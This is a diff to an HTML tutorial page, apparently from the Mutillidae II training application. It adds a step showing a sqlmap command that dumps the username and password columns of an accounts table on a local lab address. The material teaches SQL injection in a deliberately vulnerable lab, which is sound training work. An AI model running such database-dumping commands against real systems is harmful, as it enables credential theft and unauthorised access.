@@ -52,7 +52,10 @@ Once ,tables are displayed,a table name can be selected using "<b>-T &lttableNam
 </pre>
 </li>
 <li>
-	A column name can then be selected using "<b>-C &ltcolumnName&gt</b>" and the data can be dumped by specifying the option "<b>--dump</b>"
+	One or more columns may then be selected using "<b>-C &ltcolumn1Name,column2Name&gt</b>" and the data can be dumped by specifying the option "<b>--dump</b>"
+	<pre>
+./sqlmap.py -u "http://192.168.16.1:9999/mutillidae2/index.php?page=user-info.php&username=alibaba&password=password&user-info-php-submit-button=View+Account+Details" --dbs -D nowasp -T accounts -C username,password --dump
+</pre>
 	</li>
 </ul>
 </ol>
